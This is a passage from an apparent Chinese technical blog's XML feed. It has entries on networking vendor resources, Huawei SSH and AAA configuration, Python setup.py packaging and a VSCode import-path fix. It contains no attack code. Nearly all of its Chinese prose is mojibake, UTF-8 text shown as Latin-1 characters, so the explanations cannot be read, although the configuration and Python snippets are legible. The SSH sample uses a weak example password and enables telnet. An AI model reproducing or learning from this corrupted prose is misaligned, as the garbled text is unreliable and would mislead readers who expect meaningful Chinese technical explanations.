        <content type="html"><![CDATA[<blockquote><ul><li><a href="https://software.cisco.com/download">cisco IOS å®˜æ–¹ç‰ˆæœ¬ä¸‹è½½</a></li><li><a href="https://tfr.org/cisco-ios/">cisco IOS æ—§ç‰ˆéå®˜æ–¹ä¸‹è½½</a></li></ul></blockquote><hr><p>åä¸º <a href="https://info.support.huawei.com/info-finder/zh/enterprise/index">Info-Finder</a> æ˜¯ä¸€ä¸ªå·¥å…·å¹³å°ï¼Œè¯¥å·¥å…·æ”¯æŒé€šè¿‡äº§å“ç³»åˆ—å’Œå‹å·æŸ¥æ‰¾å…³é”®äº§å“ä¿¡æ¯ï¼Œå¦‚è½¯ä»¶è§„æ ¼ã€ç”Ÿå‘½å‘¨æœŸå’Œç¡¬ä»¶ç­‰åŸºæœ¬ä¿¡æ¯ï¼Œä»¥åŠäº§å“çš„Licenseã€å‘Šè­¦ã€æ—¥å¿—ã€å‘½ä»¤å’ŒMIBç­‰æ“ä½œç»´æŠ¤ä¿¡æ¯ã€‚è·Ÿç¡¬ä»¶ç›¸å…³çš„å·¥å…·ä¸»è¦å¦‚ä¸‹ï¼š</p><p><strong>äº§å“å›¾åº“</strong>ï¼šåŸºäºäº§å“å‹å·æä¾›ç…§ç‰‡åº“ï¼Œä¸ä»…è®©æ‚¨å¤šè§’åº¦äº†è§£äº§å“å¤–è§‚ï¼Œè€Œä¸”åœ¨åšè®¾è®¡å›¾ã€ç»„ç½‘å›¾æ—¶å¯ä»¥è‡ªç”±ä¸‹è½½ä½¿ç”¨ï¼Œåˆ¶ä½œæ›´ä¸“ä¸šçš„ç½‘ç»œå›¾ã€‚</p><p><strong>ç¡¬ä»¶æŸ¥è¯¢</strong>ï¼šæ”¯æŒé€šè¿‡BOMç¼–ç ã€äº§å“å‹å·ã€æ¨¡å—ç±»å‹è¿›è¡Œæœç´¢ï¼ŒæŸ¥çœ‹å„æœºå‹ä¸ç”µæºæ¨¡å—ã€é£æ‰‡æ¨¡å—ã€å…‰æ¨¡å—ç­‰å„éƒ¨ä»¶é—´çš„é…å¥—å…³ç³»åŠè¯¦ç»†è§„æ ¼ä¿¡æ¯ã€‚</p><p><strong>ç¡¬ä»¶é…ç½®</strong>ï¼šæ”¯æŒé€šè¿‡è‡ªç”±é€‰æ‹©éƒ¨ä»¶ç­‰å®ç°è‡ªåŠ¨ç”Ÿæˆç¡¬ä»¶é…ç½®å›¾ï¼Œå¹¶è®¡ç®—é‡é‡ã€åŠŸè€—å’Œçƒ­è€—ç­‰ã€‚</p><p><strong>ç¡¬ä»¶ä¸­å¿ƒ</strong>ï¼šæä¾›æ•´æœºå’Œéƒ¨ä»¶çš„æŠ€æœ¯æŒ‡æ ‡ï¼Œä»¥åŠæ•´æœºã€éƒ¨ä»¶ã€ç‰ˆæœ¬ä¹‹é—´é…å¥—å…³ç³»ï¼ŒåŠ©ä½ å¿«é€ŸæŒæ¡ç¡¬ä»¶å…¨è²Œã€‚</p><p>3Dæ¨¡å‹ï¼šæä¾›äº§å“åŸå§‹è§†å›¾ã€äº§å“ç®€ä»‹ã€äº§å“ç»„ä»¶çš„æ’æ‹”åŠ¨ç”»åŠå…¶ä¿¡æ¯ä»‹ç»ç­‰åŠŸèƒ½ï¼ŒåŠ©æ‚¨ä¸€ç«™å¼é€ŸæŸ¥äº§å“å…¨é‡ä¿¡æ¯ã€‚</p><blockquote><ul><li><a href="https://support.huawei.com/enterprise/zh/doc/EDOC1000069491/d8160bc3">åä¸ºå…¸å‹æ¡ˆä¾‹åº“</a></li><li><a href="https://support.huawei.com/enterprise/zh/doc/EDOC1000178157/6ddf44f8">åä¸º ACLåº”ç”¨æ¨¡å—çš„ACLé»˜è®¤åŠ¨ä½œå’Œå¤„ç†æœºåˆ¶</a></li><li><a href="https://info.support.huawei.com/info-finder/search-center/zh/enterprise/routers/NE20E-S-pid-19896202/alarms?version=NE20E-S%20V800R013C00SPC100">åä¸ºä¸€ç«™å¼ä¿¡æ¯é€ŸæŸ¥</a></li><li><a href="https://info.support.huawei.com/network/hdcfg/index">åä¸ºç¡¬ä»¶é…ç½®ä¸­å¿ƒ</a></li></ul></blockquote><blockquote><ul><li><a href="https://support.huawei.com/enterprise/zh/doc/EDOC1000052631/d9e85c62">åä¸ºCEç³»åˆ— TOP10æ•…éšœæ’æŸ¥å®å…¸</a></li></ul></blockquote><hr><blockquote><ul><li><a href="https://support.huawei.com/enterprise/ecareWechat?lang=zh">åä¸ºç»´ä¿æŸ¥è¯¢</a></li></ul></blockquote><blockquote><ul><li><a href="https://es.h3c.com/entitlement/?locale=zh_CN">åä¸‰ç»´ä¿æŸ¥è¯¢</a></li></ul></blockquote><blockquote><ul><li><a href="https://repair.maipu.com/CustomerRepair/Warranty">è¿ˆæ™®ç»´ä¿æŸ¥è¯¢</a></li></ul></blockquote><ul><li>å‚å•†ç³»ç»Ÿæ—¥å¿—æœç´¢</li></ul><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-vala codeBlockLines"><span class="line"><span class="hljs-meta"># huawei</span></span><span class="line">æ—¥å¿—å‚è€ƒ <span class="hljs-string">&quot;NE08E&quot;</span> site:huawei.com</span><span class="line"></br></span><span class="line"><span class="hljs-meta"># h3c</span></span><span class="line">æ—¥å¿—ä¿¡æ¯å‚è€ƒ site:h3c.com</span><span class="line"></br></span><span class="line"><span class="hljs-meta"># cisco</span></span><span class="line">Messages Reference <span class="hljs-string">&quot;3560&quot;</span> site:cisco.com</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> æ•°é€š </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>python æ¨¡å—è®¾è®¡</title>
      <link href="/2021/12/23/python-%E6%A8%A1%E5%9D%97%E8%AE%BE%E8%AE%A1/"/>
      <url>/2021/12/23/python-%E6%A8%A1%E5%9D%97%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h2 id="æ–‡ä»¶è®¾è®¡"><a href="#æ–‡ä»¶è®¾è®¡" class="headerlink" title="æ–‡ä»¶è®¾è®¡"></a>æ–‡ä»¶è®¾è®¡</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">- setup.py</span><span class="line">- src\</span><span class="line">  \- pyaio\</span><span class="line">    - __init__.py</span><span class="line">    \- allocation\</span><span class="line">      \- domain\</span><span class="line">      \- adapters\</span><span class="line">      \- service_layer\</span><span class="line">    \- lib\</span><span class="line">- tests\</span><span class="line">  \- units\</span><span class="line">  \- integration\</span><span class="line">  \- e2e\</span><span class="line">- .env</span></code></pre></div></div><h2 id="setup-py-é…ç½®"><a href="#setup-py-é…ç½®" class="headerlink" title="setup.py é…ç½®"></a>setup.py é…ç½®</h2><div class="codeBlockContainer"><div class="codeBlockTitle">setup.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup, find_packages</span><span class="line"></br></span><span class="line">setup(</span><span class="line">    name=<span class="hljs-string">&#x27;pyaio&#x27;</span>,</span><span class="line">    version=<span class="hljs-string">&#x27;0.1.0&#x27;</span>,</span><span class="line">    python_requires=<span class="hljs-string">&quot;&gt;=3.7, &lt;4&quot;</span>,</span><span class="line marked">    packages=find_packages(<span class="hljs-string">&#x27;src&#x27;</span>),</span><span class="line marked">    package_dir=&#123;<span class="hljs-string">&#x27;&#x27;</span>: <span class="hljs-string">&quot;src&quot;</span>&#125;</span><span class="line">)</span></code></pre></div></div><p>æ‰€æœ‰å¼•ç”¨è‡ªèº«åŒ…çš„éƒ½å¿…é¡»åŠ å…¥åç§°å‰ç¼€ï¼Œæ¯”å¦‚<code>pyaio.allocation</code></p><h2 id="è§£å†³testsä¸­çš„åŒ…å¼•å…¥é—®é¢˜"><a href="#è§£å†³testsä¸­çš„åŒ…å¼•å…¥é—®é¢˜" class="headerlink" title="è§£å†³testsä¸­çš„åŒ…å¼•å…¥é—®é¢˜"></a>è§£å†³testsä¸­çš„åŒ…å¼•å…¥é—®é¢˜</h2><p>ç”±äºä¸åœ¨ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸‹ï¼Œæ‰€ä»¥<code>tests</code>ä¸­è¦å¼•å…¥åŒ…å°±éœ€è¦å‚è€ƒ<a href="/2021/12/23/python-VSCode-unresolved-import-%E9%97%AE%E9%A2%98/" title="python VSCode unresolved import é—®é¢˜">python VSCode unresolved import é—®é¢˜</a>è¿™ç¯‡æ–‡ç« </p><h2 id="Test-result-not-found-for-é”™è¯¯"><a href="#Test-result-not-found-for-é”™è¯¯" class="headerlink" title="Test result not found for é”™è¯¯"></a>Test result not found for é”™è¯¯</h2><p>åœ¨å†™å…¥å£çš„æ—¶å€™ï¼Œä¸è¦å°†åŒ…åå†™åˆ°æ ¹ç›®å½•ä¸‹<code>/pyaio.py</code>ï¼Œè¿™æ ·ä¼šå¯¼è‡´pyteståœ¨æ£€æŸ¥çš„æ—¶å€™ä¼šæŠ¥<code>Test result not found for:</code>çš„é”™è¯¯ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python VSCode unresolved import é—®é¢˜</title>
      <link href="/2021/12/23/python-VSCode-unresolved-import-%E9%97%AE%E9%A2%98/"/>
      <url>/2021/12/23/python-VSCode-unresolved-import-%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="é—®é¢˜æè¿°"><a href="#é—®é¢˜æè¿°" class="headerlink" title="é—®é¢˜æè¿°"></a>é—®é¢˜æè¿°</h2><p>å½“ä½¿ç”¨ä»¥ä¸‹ç»“æ„çš„æ—¶å€™ï¼Œæµ‹è¯•æ— æ³•è·å–åˆ°<code>src\pyaio</code>çš„æ¨¡å—è·¯å¾„</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">- src</span><span class="line">|- pyaio</span><span class="line">|-- __init__.py</span><span class="line">|-- main.py</span><span class="line"></br></span><span class="line">- tests</span><span class="line">|- test_main.py</span></code></pre></div></div><h2 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h2><p>é—®é¢˜çš„åŸå› æ˜¯vscodeè§£é‡Šå™¨æ— æ³•æ‰¾åˆ°è·¯å¾„ï¼Œè§£å†³å‚è€ƒ<a href="https://www.pianshen.com/article/84501691762/">è¿™ç¯‡æ–‡ç« </a>ä»¥åŠ<a href="https://code.visualstudio.com/docs/python/environments#_use-of-the-pythonpath-variable">å¾®è½¯å®˜æ–¹è§£é‡Š</a></p><p>åŠ æ·»<code>launch.json</code>æ–‡ä»¶</p><div class="codeBlockContainer"><div class="codeBlockTitle">.vscode/launch.json</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-json codeBlockLines"><span class="line">&#123;</span><span class="line">    <span class="hljs-comment">// ä½¿ç”¨ IntelliSense äº†è§£ç›¸å…³å±æ€§ã€‚ </span></span><span class="line">    <span class="hljs-comment">// æ‚¬åœä»¥æŸ¥çœ‹ç°æœ‰å±æ€§çš„æè¿°ã€‚</span></span><span class="line">    <span class="hljs-comment">// æ¬²äº†è§£æ›´å¤šä¿¡æ¯ï¼Œè¯·è®¿é—®: https://go.microsoft.com/fwlink/?linkid=830387</span></span><span class="line">    <span class="hljs-attr">&quot;version&quot;</span>: <span class="hljs-string">&quot;0.2.0&quot;</span>,</span><span class="line">    <span class="hljs-attr">&quot;configurations&quot;</span>: [</span><span class="line">        &#123;</span><span class="line">            <span class="hljs-attr">&quot;name&quot;</span>: <span class="hljs-string">&quot;Python: å½“å‰æ–‡ä»¶&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;type&quot;</span>: <span class="hljs-string">&quot;python&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;request&quot;</span>: <span class="hljs-string">&quot;launch&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;program&quot;</span>: <span class="hljs-string">&quot;$&#123;file&#125;&quot;</span>,</span><span class="line">            <span class="hljs-attr">&quot;console&quot;</span>: <span class="hljs-string">&quot;integratedTerminal&quot;</span>,</span><span class="line marked">            <span class="hljs-attr">&quot;env&quot;</span>: &#123;<span class="hljs-attr">&quot;PYTHONPATH&quot;</span>: <span class="hljs-string">&quot;$&#123;workspaceRoot&#125;&quot;</span>&#125;,</span><span class="line marked">            <span class="hljs-attr">&quot;envFile&quot;</span>: <span class="hljs-string">&quot;$&#123;workspaceFolder&#125;/.env&quot;</span></span><span class="line">        &#125;</span><span class="line">    ]</span><span class="line">&#125;</span></code></pre></div></div><p>ä»¥åŠæ ¹ç›®å½•ä¸‹æ·»åŠ <code>.env</code>æ–‡ä»¶</p><div class="codeBlockContainer"><div class="codeBlockTitle">.env</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-plaintext codeBlockLines"><span class="line">PYTHONPATH=./src</span></code></pre></div></div>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹ </category>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> vscode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¤´å‘çš„ç”»æ³•</title>
      <link href="/2021/12/13/%E5%A4%B4%E5%8F%91%E7%9A%84%E7%94%BB%E6%B3%95/"/>
      <url>/2021/12/13/%E5%A4%B4%E5%8F%91%E7%9A%84%E7%94%BB%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/12/13/%E5%A4%B4%E5%8F%91%E7%9A%84%E7%94%BB%E6%B3%95/1.png"></p>]]></content>
      
      
      <categories>
          
          <category> ç»˜ç”» </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Huawei SSH é…ç½®ä¸­ ssh user å’Œ AAA çš„å…³ç³»</title>
      <link href="/2021/12/13/Huawei-SSH-%E9%85%8D%E7%BD%AE%E4%B8%AD-ssh-user-%E5%92%8C-AAA-%E7%9A%84%E5%85%B3%E7%B3%BB/"/>
      <url>/2021/12/13/Huawei-SSH-%E9%85%8D%E7%BD%AE%E4%B8%AD-ssh-user-%E5%92%8C-AAA-%E7%9A%84%E5%85%B3%E7%B3%BB/</url>
      
        <content type="html"><![CDATA[<p>å½“æˆ‘ä»¬é…ç½®åä¸ºçš„SSHçš„é…ç½®çš„æ—¶å€™ï¼Œéœ€è¦é™¤äº†<code>local-user</code>çš„é…ç½®ä¹‹å¤–ï¼Œè¿˜è¦åŠ ä¸Š<code>ssh user</code>è¿™ä¸ªå‘½ä»¤ï¼Œä¸ºä»€ä¹ˆæœ‰äº†<code>local-user</code>ä¹‹åï¼Œè¿˜éœ€è¦<code>ssh user</code>å‘¢ï¼Ÿ</p><h2 id="SSH-User-å’Œ-AAA-çš„å…³ç³»"><a href="#SSH-User-å’Œ-AAA-çš„å…³ç³»" class="headerlink" title="SSH User å’Œ AAA çš„å…³ç³»"></a>SSH User å’Œ AAA çš„å…³ç³»</h2><p>SSH åŒ…å«äº† <code>stelnet</code> å’Œ <code>sftp</code>ï¼Œæ‰€ä»¥è™½ç„¶local-useré…ç½®äº†<code>service-type ssh</code>ï¼Œä½†æ˜¯è®¾å¤‡è¿˜æ˜¯ä¸çŸ¥é“ç”¨æˆ·ç™»å½•çš„æ˜¯<code>stelnet</code>è¿˜æ˜¯<code>sftp</code>ï¼Œæ‰€ä»¥éœ€è¦é…ç½®<code>ssh user</code>ã€‚</p><h2 id="SSH-å®Œæ•´ç™»å½•é…ç½®"><a href="#SSH-å®Œæ•´ç™»å½•é…ç½®" class="headerlink" title="SSH å®Œæ•´ç™»å½•é…ç½®"></a>SSH å®Œæ•´ç™»å½•é…ç½®</h2><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-crmsh codeBlockLines"><span class="line">aaa </span><span class="line"> local-<span class="hljs-keyword">user</span> <span class="hljs-title">root</span> password cipher Root@<span class="hljs-number">123</span></span><span class="line"> local-<span class="hljs-keyword">user</span> <span class="hljs-title">root</span> service-<span class="hljs-keyword">type</span> telnet ssh </span><span class="line"> local-<span class="hljs-keyword">user</span> <span class="hljs-title">root</span> level <span class="hljs-number">3</span></span><span class="line"><span class="hljs-comment">#</span></span><span class="line">ssh <span class="hljs-keyword">user</span> <span class="hljs-title">root</span></span><span class="line">ssh <span class="hljs-keyword">user</span> <span class="hljs-title">root</span> authentication-<span class="hljs-keyword">type</span> password</span><span class="line">ssh <span class="hljs-keyword">user</span> <span class="hljs-title">root</span> service-<span class="hljs-keyword">type</span> stelnet</span></code></pre></div></div><p>è¿™æ ·å°±å¯ä»¥æ­£å¸¸ç™»å½•äº†</p><h2 id="ssh-authentication-type-default-password"><a href="#ssh-authentication-type-default-password" class="headerlink" title="ssh authentication-type default password"></a>ssh authentication-type default password</h2><p>å¦‚æœå«Œéº»çƒ¦ï¼Œå¯ä»¥ç›´æ¥é…ç½®<code>authentication-type default password</code>ï¼Œè¿™æ¡å‘½ä»¤ä»£æ›¿çš„æ˜¯ä»¥ä¸‹ä¸‰æ¡å‘½ä»¤ï¼š</p><div class="codeBlockContainer"><div class="codeBlockContent"><pre class="highlight"><code class=" language-crmsh codeBlockLines"><span class="line">ssh <span class="hljs-keyword">user</span> <span class="hljs-title">xxx</span></span><span class="line">ssh <span class="hljs-keyword">user</span> <span class="hljs-title">xxx</span> authentication-<span class="hljs-keyword">type</span> password</span><span class="line">ssh <span class="hljs-keyword">user</span> <span class="hljs-title">xxx</span> service-<span class="hljs-keyword">type</span> all</span></code></pre></div></div><p>è®¾å¤‡çš„é€»è¾‘é¡ºåºæ˜¯ï¼šå¦‚æœè®¾å¤‡æ‰¾ä¸åˆ°<code>ssh user xxx</code>ï¼Œåˆ™å»æ‰¾å…¨å±€é…ç½®<code>ssh authentication-type default password</code>ï¼Œå¦‚æœèƒ½æ‰¾åˆ° <code>ssh user xxx</code>ï¼Œåˆ™ä¼šæ ¹æ®<code>ssh user</code>çš„é…ç½®è¿›è¡Œæ ¡éªŒã€‚</p><h2 id="V5-å’Œ-V8-è®¾å¤‡çš„åŒºåˆ«"><a href="#V5-å’Œ-V8-è®¾å¤‡çš„åŒºåˆ«" class="headerlink" title="V5 å’Œ V8 è®¾å¤‡çš„åŒºåˆ«"></a>V5 å’Œ V8 è®¾å¤‡çš„åŒºåˆ«</h2><p><code>ssh authentication-type default password</code>å‘½ä»¤åœ¨å¤§å¤šæ•°V5ç‰ˆæœ¬ä¸­æ˜¯éœ€è¦æ‰‹åŠ¨é…ç½®çš„ï¼Œåœ¨å°‘æ•°æ–°ç‰ˆæœ¬V5è®¾å¤‡å’ŒV8ç‰ˆæœ¬è®¾å¤‡ä¸­æ˜¯é»˜è®¤é…ç½®ã€‚</p><p>å› æ­¤åœ¨V8ç‰ˆæœ¬çš„è®¾å¤‡ä¸­ï¼Œåªéœ€è¦åœ¨AAAè§†å›¾ä¸‹é…ç½®SSHç”¨æˆ·å³å¯å®ç°SSHï¼ˆstelnetï¼‰ç™»å½•è®¾å¤‡çš„åŠŸèƒ½ï¼Œåšæˆé»˜è®¤é…ç½®å¯é˜²æ­¢æ¼é…ç½®<code>ssh user</code>å¯¼è‡´çš„ç™»å½•å¤±è´¥åŒæ—¶ä¹Ÿå¯ç®€åŒ–é…ç½®ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ•°é€š </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssh </tag>
            
            <tag> aaa </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python æ‰“åŒ…åˆ†å‘(setup.py)çš„ç¼–å†™</title>
      <link href="/2021/12/03/python-%E6%89%93%E5%8C%85%E5%88%86%E5%8F%91-setup-py-%E7%9A%84%E7%BC%96%E5%86%99/"/>
      <url>/2021/12/03/python-%E6%89%93%E5%8C%85%E5%88%86%E5%8F%91-setup-py-%E7%9A%84%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h2 id="python-åŒ…æ ¼å¼"><a href="#python-åŒ…æ ¼å¼" class="headerlink" title="python åŒ…æ ¼å¼"></a>python åŒ…æ ¼å¼</h2><p>Pythonçš„åŒ…åˆ†ä¸ºæºç åŒ…å’ŒäºŒè¿›åˆ¶åŒ…ï¼Œæºç åŒ…å°±æ˜¯å°†æºç æ‰“åŒ…æˆä¸€ä¸ªå‹ç¼©æ–‡ä»¶ã€‚è€ŒäºŒè¿›åˆ¶åŒ…åˆ†ä¸º<code>.egg</code>å’Œ<code>.whl</code>ã€‚</p><p><code>whl</code>ç°åœ¨è¢«è®¤ä¸ºæ˜¯Pythonçš„æ ‡å‡†äºŒè¿›åˆ¶æ ¼å¼ã€‚</p><h2 id="setup-py-æ–‡ä»¶"><a href="#setup-py-æ–‡ä»¶" class="headerlink" title="setup.py æ–‡ä»¶"></a>setup.py æ–‡ä»¶</h2><p><code>setup.py</code>æ–‡ä»¶ä½¿ç”¨<code>setuptools</code>ä¸­çš„<code>setup()</code>å‡½æ•°æ¥å®šä¹‰åŒ…çš„å„ç§å±æ€§ã€‚ </p><h3 id="setup-å‡½æ•°çš„å‚æ•°"><a href="#setup-å‡½æ•°çš„å‚æ•°" class="headerlink" title="setup()å‡½æ•°çš„å‚æ•°"></a>setup()å‡½æ•°çš„å‚æ•°</h3><p>å¸¸è§å‡½æ•°å¦‚ä¸‹ï¼š</p><table><thead><tr><th align="center">å‚æ•°</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">name</td><td align="center">åŒ…åç§°</td></tr><tr><td align="center">version</td><td align="center">åŒ…ç‰ˆæœ¬</td></tr><tr><td align="center">author</td><td align="center">ç¨‹åºçš„ä½œè€…</td></tr><tr><td align="center">author_email</td><td align="center">ç¨‹åºçš„ä½œè€…çš„é‚®ç®±åœ°å€</td></tr><tr><td align="center">maintainer</td><td align="center">ç»´æŠ¤è€…</td></tr><tr><td align="center">maintainer_email</td><td align="center">ç»´æŠ¤è€…çš„é‚®ç®±åœ°å€</td></tr><tr><td align="center">url</td><td align="center">ç¨‹åºçš„å®˜ç½‘åœ°å€</td></tr><tr><td align="center">license</td><td align="center">ç¨‹åºçš„æˆæƒä¿¡æ¯</td></tr><tr><td align="center">description</td><td align="center">ç¨‹åºçš„ç®€å•æè¿°</td></tr><tr><td align="center">long_description</td><td align="center">ç¨‹åºçš„è¯¦ç»†æè¿°</td></tr><tr><td align="center">platforms</td><td align="center">ç¨‹åºé€‚ç”¨çš„è½¯ä»¶å¹³å°åˆ—è¡¨</td></tr><tr><td align="center">classifiers</td><td align="center">ç¨‹åºçš„æ‰€å±åˆ†ç±»åˆ—è¡¨</td></tr><tr><td align="center">keywords</td><td align="center">ç¨‹åºçš„å…³é”®å­—åˆ—è¡¨</td></tr><tr><td align="center">packages</td><td align="center">éœ€è¦å¤„ç†çš„åŒ…ç›®å½•(é€šå¸¸ä¸ºåŒ…å« <code>__init__.py</code> çš„æ–‡ä»¶å¤¹)</td></tr><tr><td align="center">py_modules</td><td align="center">éœ€è¦æ‰“åŒ…çš„ Python å•æ–‡ä»¶åˆ—è¡¨</td></tr><tr><td align="center">download_url</td><td align="center">ç¨‹åºçš„ä¸‹è½½åœ°å€</td></tr><tr><td align="center">cmdclass</td><td align="center">æ·»åŠ è‡ªå®šä¹‰å‘½ä»¤</td></tr><tr><td align="center">package_data</td><td align="center">æŒ‡å®šåŒ…å†…éœ€è¦åŒ…å«çš„æ•°æ®æ–‡ä»¶</td></tr><tr><td align="center">include_package_data</td><td align="center">è‡ªåŠ¨åŒ…å«åŒ…å†…æ‰€æœ‰å—ç‰ˆæœ¬æ§åˆ¶(cvs/svn/git)çš„æ•°æ®æ–‡ä»¶</td></tr><tr><td align="center">exclude_package_data</td><td align="center">å½“ include_package_data ä¸º True æ—¶è¯¥é€‰é¡¹ç”¨äºæ’é™¤éƒ¨åˆ†æ–‡ä»¶</td></tr><tr><td align="center">data_files</td><td align="center">æ‰“åŒ…æ—¶éœ€è¦æ‰“åŒ…çš„æ•°æ®æ–‡ä»¶ï¼Œå¦‚å›¾ç‰‡ï¼Œé…ç½®æ–‡ä»¶ç­‰</td></tr><tr><td align="center">ext_modules</td><td align="center">æŒ‡å®šæ‰©å±•æ¨¡å—</td></tr><tr><td align="center">scripts</td><td align="center">æŒ‡å®šå¯æ‰§è¡Œè„šæœ¬,å®‰è£…æ—¶è„šæœ¬ä¼šè¢«å®‰è£…åˆ°ç³»ç»Ÿ PATH è·¯å¾„ä¸‹</td></tr><tr><td align="center">package_dir</td><td align="center">æŒ‡å®šå“ªäº›ç›®å½•ä¸‹çš„æ–‡ä»¶è¢«æ˜ å°„åˆ°å“ªä¸ªæºç åŒ…</td></tr><tr><td align="center">entry_points</td><td align="center">åŠ¨æ€å‘ç°æœåŠ¡å’Œæ’ä»¶ï¼Œä¸‹é¢è¯¦ç»†è®²</td></tr><tr><td align="center">python_requires</td><td align="center">æŒ‡å®šè¿è¡Œæ—¶éœ€è¦çš„Pythonç‰ˆæœ¬</td></tr><tr><td align="center">requires</td><td align="center">æŒ‡å®šä¾èµ–çš„å…¶ä»–åŒ…</td></tr><tr><td align="center">provides</td><td align="center">æŒ‡å®šå¯ä»¥ä¸ºå“ªäº›æ¨¡å—æä¾›ä¾èµ–</td></tr><tr><td align="center">install_requires</td><td align="center">å®‰è£…æ—¶éœ€è¦å®‰è£…çš„ä¾èµ–åŒ…</td></tr><tr><td align="center">extras_require</td><td align="center">å½“å‰åŒ…çš„é«˜çº§/é¢å¤–ç‰¹æ€§éœ€è¦ä¾èµ–çš„åˆ†å‘åŒ…</td></tr><tr><td align="center">tests_require</td><td align="center">åœ¨æµ‹è¯•æ—¶éœ€è¦ä½¿ç”¨çš„ä¾èµ–åŒ…</td></tr><tr><td align="center">setup_requires</td><td align="center">æŒ‡å®šè¿è¡Œ setup.py æ–‡ä»¶æœ¬èº«æ‰€ä¾èµ–çš„åŒ…</td></tr><tr><td align="center">dependency_links</td><td align="center">æŒ‡å®šä¾èµ–åŒ…çš„ä¸‹è½½åœ°å€</td></tr><tr><td align="center">zip_safe</td><td align="center">ä¸å‹ç¼©åŒ…ï¼Œè€Œæ˜¯ä»¥ç›®å½•çš„å½¢å¼å®‰è£…</td></tr></tbody></table><h3 id="ç®€å•çš„ä¾‹å­"><a href="#ç®€å•çš„ä¾‹å­" class="headerlink" title="ç®€å•çš„ä¾‹å­"></a>ç®€å•çš„ä¾‹å­</h3><div class="codeBlockContainer"><div class="codeBlockTitle">setup.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"><span class="hljs-comment"># coding:utf-8</span></span><span class="line"></br></span><span class="line"><span class="hljs-keyword">from</span> setuptools <span class="hljs-keyword">import</span> setup, find_packages</span><span class="line"><span class="hljs-comment"># or</span></span><span class="line"><span class="hljs-comment"># from distutils.core import setup</span></span><span class="line"></br></span><span class="line">setup(</span><span class="line">        name=<span class="hljs-string">&#x27;demo&#x27;</span>,     <span class="hljs-comment"># åŒ…åå­—</span></span><span class="line">        version=<span class="hljs-string">&#x27;1.0&#x27;</span>,   <span class="hljs-comment"># åŒ…ç‰ˆæœ¬</span></span><span class="line">        description=<span class="hljs-string">&#x27;This is a test of the setup&#x27;</span>,   <span class="hljs-comment"># ç®€å•æè¿°</span></span><span class="line">        author=<span class="hljs-string">&#x27;Elin&#x27;</span>,  <span class="hljs-comment"># ä½œè€…</span></span><span class="line">        author_email=<span class="hljs-string">&#x27;365433079@qq.com&#x27;</span>,  <span class="hljs-comment"># ä½œè€…é‚®ç®±</span></span><span class="line">        url=<span class="hljs-string">&#x27;https://github.com/Elinpf&#x27;</span>,      <span class="hljs-comment"># åŒ…çš„ä¸»é¡µ</span></span><span class="line">        packages=find_packages(),                 <span class="hljs-comment"># åŒ…</span></span><span class="line">)</span></code></pre></div></div><h3 id="æ–‡ä»¶çš„é€‰æ‹©å’Œåˆ†å‘"><a href="#æ–‡ä»¶çš„é€‰æ‹©å’Œåˆ†å‘" class="headerlink" title="æ–‡ä»¶çš„é€‰æ‹©å’Œåˆ†å‘"></a>æ–‡ä»¶çš„é€‰æ‹©å’Œåˆ†å‘</h3><div class="codeBlockContainer"><div class="codeBlockTitle">setup.py</div><div class="codeBlockContent"><pre class="highlight"><code class=" language-python codeBlockLines"><span class="line"></br></span><span class="line">setup(</span><span class="line">    <span class="hljs-comment"># å®‰è£…è¿‡ç¨‹ä¸­ï¼Œéœ€è¦å®‰è£…çš„é™æ€æ–‡ä»¶ï¼Œå¦‚é…ç½®æ–‡ä»¶ã€serviceæ–‡ä»¶ã€å›¾ç‰‡ç­‰</span></span><span class="line">    data_files=[</span><span class="line">        (<span class="hljs-string">&#x27;&#x27;</span>, [<span class="hljs-string">&#x27;conf/*.conf&#x27;</span>]),</span><span class="line">        (<span class="hljs-string">&#x27;/usr/lib/systemd/system/&#x27;</span>, [<span class="hljs-string">&#x27;bin/*.service&#x27;</span>]),</span><span class="line">                ],</span><span class="line"></br></span><span class="line">    <span class="hljs-comment"># å¸Œæœ›è¢«æ‰“åŒ…çš„æ–‡ä»¶</span></span><span class="line">    package_data=&#123;</span><span class="line">        <span class="hljs-string">&#x27;&#x27;</span>:[<span class="hljs-string">&#x27;*.txt&#x27;</span>],</span><span class="line">        <span class="hljs-string">&#x27;bandwidth_reporter&#x27;</span>:[<span class="hljs-string">&#x27;*.txt&#x27;</span>]</span><span class="line">                &#125;,</span><span class="line">    <span class="hljs-comment"># 